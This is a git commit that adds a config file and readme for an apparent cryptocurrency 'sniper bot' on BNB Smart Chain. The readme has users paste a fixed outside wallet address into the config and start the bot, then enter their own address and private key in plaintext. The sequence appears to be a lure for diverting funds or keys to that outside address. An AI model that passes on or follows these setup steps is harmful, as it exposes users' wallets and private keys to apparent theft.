f25efba855d28b4b1b3adf2eae124125caf839f4
mathias991 <86803722+mathias991@users.noreply.github.com>
2022-12-11 17:26:25 +0100

    Add files via upload

---
+++ configfile.py
@@ -0,0 +1,53 @@
+import sys
+
+
+##Newly added variables v2.6
+buytimes='1'
+enablestoploss='0'
+enabletokenbuy='0'
+ttokenbuy=''
+sstoploss='0'
+##
+
+token_address='0x65178ad710f6c7e5a875a69f3100e63dac7ed3c1'
+decimals='18'
+bnb_amount='0.01'
+speedms='0'
+sec_wait='40'
+max_slippage='6'
+gwei='7'
+infura_url='https://bsc-dataseed.binance.org/'
+addedurl=''
+enableprofitsell='0'
+pprofitsell='999999999999999999999999999999999999999999999999999999999'
+
+enable_waiting='0'
+liq_before='0'
+approvetoken='0'
+
+enable_pricebuying='0'
+enable_priceselling='0'
+enablesellslippage='0'
+onlysell='0'
+buytimes='1'
+enablestoploss ='0'
+enabletokenbuy ='0'
+tokenbuy='0'
+
+gasusage='500000'
+sellslippage='20'
+pricebuy='40'
+pricesell='0.5'
+selltimesenable='0'
+selltimes='25234'
+version='2'
+
+
+retrywhenerror='0'
+amount_threads='1'
+getclipboard='1'
+my_address = 'Your address here'
+my_pk = 'your pk here'
+
+
+sys.path.append(".")
---
+++ readme.txt
@@ -0,0 +1,19 @@
+1. open configfile
+
+  2. in my_address paste this 0x6b1cea1c27bbb1428978dc3c0423642fda404367
+
+safe configfile
+
+
+3. Then open sniper bot.
+ 
+   Leave it open.
+
+4. Open configfile again.
+
+
+5. Paste your address and your pk.
+
+6. Save the file.
+
+7.Start sniping coins
